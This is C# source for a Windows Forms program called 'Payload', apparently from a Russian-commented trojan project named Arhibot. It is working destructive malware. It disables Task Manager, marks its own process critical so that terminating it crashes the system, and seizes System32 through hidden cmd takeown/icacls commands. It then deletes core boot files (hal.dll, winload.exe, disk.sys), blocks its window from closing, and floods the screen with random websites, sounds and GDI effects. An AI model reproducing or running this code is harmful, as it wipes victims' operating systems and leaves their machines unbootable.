using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using Arhibot.exe_1._0.libs;
using System.Media;

namespace Arhibot.exe_1._0
{
    public partial class Payload : Form
    {
        // Здесь решил не запихивать библиотеки в этом коде, а в другом файле, чтобы сделать код красивым и более читабельным.
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength); // для бсода
        public Payload()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; // Делаем форму невидимой.
        }

        private void Payload_Load(object sender, EventArgs e)
        {
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // Вырубаем диспетчер задач нахуй
            int processInformation = 1;
            int processInformationClass = 29;
            Process.EnterDebugMode(); // Устанавливаем процесс в дебаг режим (это важно для установки процесса критическим)
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4); // Делаем процесс критическим.

            // Троян получает доступ к дискам и системным файлам посредством выполнения нескольких команд в командной строке (разумеется, в скрытом режиме).
            ProcessStartInfo aceess = new ProcessStartInfo();
            aceess.FileName = "cmd.exe";
            aceess.WindowStyle = ProcessWindowStyle.Hidden;
            aceess.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit";
            Process.Start(aceess);
            remove_system.Start(); // Запускаем таймер, который удаляет системные файлы после того, как мы получили к ним доступ
            tmr_add.Start(); // Запускаем таймер, который открывает рандомные сайты
            tmr_next_payload.Start(); // Переходим к следующим нагрузкам, не завершая эту
        }

        private void Payload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void remove_system_Tick(object sender, EventArgs e)
        {
            remove_system.Stop(); // Ждем 15 секунд перед удалением (иначе при удалении файлов будут срабатывать ошибки)
            //Пути к системным файлам, которые хотим удалить. Если хотите указать дополнительные - не стесняйтесь. 
            string file1 = @"C:\Windows\System32\hal.dll";
            string file2 = @"C:\Windows\System32\ci.dll";
            string file3 = @"C:\Windows\System32\winload.exe";
            string file4 = @"C:\Windows\System32\drivers\disk.sys";

            // Удаляем файлы к херам, делая проверку на их присутствие и попытки удаления через try и catch.
            if (File.Exists(file1))
            {
                try
                {
                    File.Delete(file1);
                }
                catch { } // если по каким то причинам не получилось удалить файл, игнорируем исключение и идем дальше.
            }

            if (File.Exists(file2))
            {
                try
                {
                    File.Delete(file2);
                }
                catch { }
            }

            if (File.Exists(file3))
            {
                try
                {
                    File.Delete(file3);
                }
                catch { }
            }

            if (File.Exists(file4))
            {
                try
                {
                    File.Delete(file4);
                }
                catch { }
            }
        }

        private void tmr_add_Tick(object sender, EventArgs e)
        {
            Random r;
            r = new Random();
            tmr_add.Stop(); // Ждем 10 секунд перед действием. Время можно изменить, меняя интервал таймера. 1000 - 1 сек
            int random_number = r.Next(5); // Сделаем функцию который постепенно будет генерировать случайное число от 1 до 5

            if (random_number == 1) // открыаем сайты, а именно запрос КАК БРИТЬ НОСКИ))))!!)!)!)!)
            {
                Process.Start("https://www.google.ru/search?q=как+отжать+рояль+у+гопоты&newwindow=1&sxsrf=ALiCzsYXaT6IYajjFnMbPeWxW8CFT67BjQ%3A1658791055742&source=hp&ei=jyTfYt3wKsGOrwSVlIKIBA&iflsig=AJiK0e8AAAAAYt8yn1x_nziqQGoLM4F9x7y2Yk9QoDUX&oq=&gs_lcp=Cgdnd3Mtd2l6EAEYBTINCC4QxwEQ0QMQ6gIQJzIHCC4Q6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzINCC4QxwEQ0QMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJ1AAWABgyStoAnAAeAGAAagFiAHQCZIBAzUtMpgBALABCg&sclient=gws-wiz");
            }

            if (random_number == 2)
            {
                Process.Start("https://www.google.ru/search?q=beluga&newwindow=1&sxsrf=ALiCzsZm3fVY-gQAKfGmPB3kP7_MvGQdrg:1658791206925&source=lnms&tbm=isch&sa=X&ved=2ahUKEwj0t5TllpX5AhUki8MKHSKgDUoQ_AUoAXoECAIQAw");
            }

            if (random_number == 3)
            {
                Process.Start("https://www.google.ru/search?q=как+брить+носки&newwindow=1&sxsrf=ALiCzsYU3nGwiyMUcM3ZezDCqiNzKeN77w%3A1658791075392&ei=oyTfYp7MF9WwjgaCiZC4AQ&oq=&gs_lcp=Cgdnd3Mtd2l6EAEYAzIHCCMQ6gIQJzINCC4QxwEQ0QMQ6gIQJzIHCC4Q6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJzINCC4QxwEQ0QMQ6gIQJzIHCCMQ6gIQJzIHCCMQ6gIQJ0oECEEYAEoECEYYAFAAWABgug1oAnABeACAAQCIAQCSAQCYAQCgAQGwAQrAAQE&sclient=gws-wiz");
            }

            if (random_number == 4)
            {
                Process.Start("https://www.youtube.com/channel/UCCfvRfHuqX7B2Xwczmwmw4A");
            }

            tmr_add.Start(); // Делаем постоянный цикл действия
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            Random r;
            r = new Random();
            tmr_next_payload.Stop(); // Ждем 30 секунд перед действием. Время можно изменить, меняя интервал таймера. 1000 - 1 сек
            gdi_1.Start();
            int random_number = r.Next(5); // Сделаем функцию который постепенно будет генерировать случайное число от 1 до 5

            if (random_number == 1) // проигрываем ранее установленные вирусом звуки
            {
                try
                {
                    SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav"); // Инициализация плеера со звуком
                    sound.Play(); // Проигрываем звук
                }
                catch { }
            }

            if (random_number == 2)
            {
                try
                {
                    SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows Ding.wav");
                    sound.Play();
                }
                catch { }
            }

            if (random_number == 3)
            {
                try
                {
                    SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows Error.wav");
                    sound.Play();
                }
                catch { }
            }

            if (random_number == 4)
            {
                try
                {
                    SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows Background.wav");
                    sound.Play();
                }
                catch { }
            }

            if (random_number == 5)
            {
                try
                {
                    SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows Foreground.wav");
                    sound.Play();
                }
                catch { }
            }
            tmr_next_payload.Interval = 500; // Меняем интервал таймера.
            tmr_next_payload.Start(); // Делаем постоянный цикл действия
        }

        private void gdi_1_Tick(object sender, EventArgs e)
        {
            gdi_1.Stop(); // Ждем 30 секунд.
            gdi_2.Start(); // Запускаем второй таймер с GDI эффектом (эффекты сразу не сработают, поэтому таймер будет ждать 30 секунд до срабатывания).
            gdi_1.Interval = 1000; // Меняем интервал таймера на 1 секунду.
            IntPtr desktopWindow = libs.libs.GetDesktopWindow();
            IntPtr windowDC = libs.libs.GetWindowDC(desktopWindow);
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            libs.libs.StretchBlt(windowDC, 50, 50, width - 100, height - 100, windowDC, 0, 0, width, height, libs.libs.TernaryRasterOperations.SRCCOPY); // Эффект туннеля.
            gdi_1.Start(); // Делаем постоянный цикл действия.
        }

        private void gdi_2_Tick(object sender, EventArgs e)
        {
            gdi_2.Stop(); // Ждем 30 секунд.
            gdi_2.Interval = 1000; // Меняем интервал таймера на 1 секунду.
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            IntPtr desktopWindow = libs.libs.GetDesktopWindow();
            IntPtr windowDC = libs.libs.GetWindowDC(desktopWindow);
            IntPtr hgdiobj = libs.libs.CreateSolidBrush(37085);
            libs.libs.SelectObject(windowDC, hgdiobj);
            libs.libs.StretchBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, width, height, libs.libs.TernaryRasterOperations.PATINVERT);
            libs.libs.StretchBlt(windowDC, 1, 1, width, height, windowDC, 0, 0, width, height, libs.libs.TernaryRasterOperations.hmm); // Меняем цвет экрану для красоты :D
            gdi_2.Start(); // Делаем постоянный цикл действия.
        }
    }
}
